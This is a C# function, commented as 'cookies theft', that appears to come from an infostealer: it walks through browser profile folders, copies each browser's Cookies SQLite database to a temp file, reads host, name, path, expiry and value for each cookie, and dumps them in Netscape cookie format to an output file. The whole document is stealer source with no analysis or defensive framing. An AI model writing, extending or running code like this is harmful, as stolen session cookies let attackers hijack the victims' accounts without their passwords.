// cookies theft
public static void SAVE(string filename)
{
    int counter = 0;

    using (StreamWriter sw = new StreamWriter(filename))
    {
        foreach (string browser in Paths.Browser)
        {
            string Browser = Paths.GetUserData(browser) + "Cookies";
            if (File.Exists(Browser))
            {
                string temp = Environment.GetEnvironmentVariable("temp") + "\\browserCookies";
                if (File.Exists(temp))
                {
                    File.Delete(temp);
                }
                File.Copy(Browser, temp);

                SQL sSQLite = new SQL(temp);
                sSQLite.ReadTable("cookies");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    string value = sSQLite.GetValue(i, 12);
                    string hostKey = sSQLite.GetValue(i, 1);
                    string name = sSQLite.GetValue(i, 2);
                    string path = sSQLite.GetValue(i, 4);
                    string expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(sSQLite.GetValue(i, 5))), TimeZoneInfo.Local));
                    string isSecure = sSQLite.GetValue(i, 6).ToUpper();

                    if (string.IsNullOrEmpty(name))
                    {
                        break;
                    }

                    try
                    {
                        sw.WriteLine($"{hostKey}\tTRUE\t{path}\tFALSE\t{expires}\t{Decryptor.GetUTF8(name)}\t{value}\r\n");
                        counter++;
                    }
                    catch { }

                    continue;
                }
            }
        }
    }

    Console.WriteLine($"Found {counter} cookies data and saved in {filename}");
}